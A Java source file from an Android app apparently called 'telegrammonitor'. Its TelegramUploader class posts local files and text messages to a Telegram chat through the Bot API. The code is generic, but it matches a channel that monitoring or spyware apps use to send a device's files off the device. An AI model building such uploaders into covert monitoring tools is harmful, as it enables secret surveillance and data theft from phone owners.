package com.nehal.telegrammonitor;

import android.util.Log;
import java.io.File;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Scanner;

public class TelegramUploader {

    public static void sendDocument(String botToken, String chatId, File file, String fileType) {
        try {
            String requestURL = "https://api.telegram.org/bot" + botToken + "/sendDocument";
            String boundary = "*****" + System.currentTimeMillis() + "*****";
            String LINE_FEED = "\r\n";

            HttpURLConnection conn = (HttpURLConnection) new URL(requestURL).openConnection();
            conn.setUseCaches(false);
            conn.setDoOutput(true);
            conn.setDoInput(true);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "multipart/form-data; boundary=" + boundary);

            OutputStream outputStream = conn.getOutputStream();
            OutputStreamWriter writer = new OutputStreamWriter(outputStream);

            writer.append("--").append(boundary).append(LINE_FEED);
            writer.append("Content-Disposition: form-data; name=\"chat_id\"").append(LINE_FEED);
            writer.append(LINE_FEED);
            writer.append(chatId).append(LINE_FEED);

            writer.append("--").append(boundary).append(LINE_FEED);
            writer.append("Content-Disposition: form-data; name=\"document\"; filename=\"")
                  .append(file.getName()).append("\"").append(LINE_FEED);
            writer.append("Content-Type: application/octet-stream").append(LINE_FEED);
            writer.append(LINE_FEED);
            writer.flush();

            java.nio.file.Files.copy(file.toPath(), outputStream);
            outputStream.flush();

            writer.append(LINE_FEED);
            writer.append("--").append(boundary).append("--").append(LINE_FEED);
            writer.close();

            int responseCode = conn.getResponseCode();
            Scanner in = new Scanner(conn.getInputStream()).useDelimiter("\\A");
            String response = in.hasNext() ? in.next() : "";
            in.close();

            Log.d("TelegramUploader", "Response: " + response);

        } catch (Exception e) {
            Log.e("TelegramUploader", "Upload failed: " + e.getMessage());
        }
    }

    public static void sendText(String botToken, String chatId, String text) {
        try {
            String requestURL = "https://api.telegram.org/bot" + botToken + "/sendMessage";
            String data = "chat_id=" + chatId + "&text=" + java.net.URLEncoder.encode(text, "UTF-8");

            HttpURLConnection conn = (HttpURLConnection) new URL(requestURL).openConnection();
            conn.setRequestMethod("POST");
            conn.setDoOutput(true);
            conn.getOutputStream().write(data.getBytes());

            int responseCode = conn.getResponseCode();
            Scanner in = new Scanner(conn.getInputStream()).useDelimiter("\\A");
            String response = in.hasNext() ? in.next() : "";
            in.close();

            Log.d("TelegramUploader", "Text sent: " + response);
        } catch (Exception e) {
            Log.e("TelegramUploader", "Text send failed: " + e.getMessage());
        }
    }
}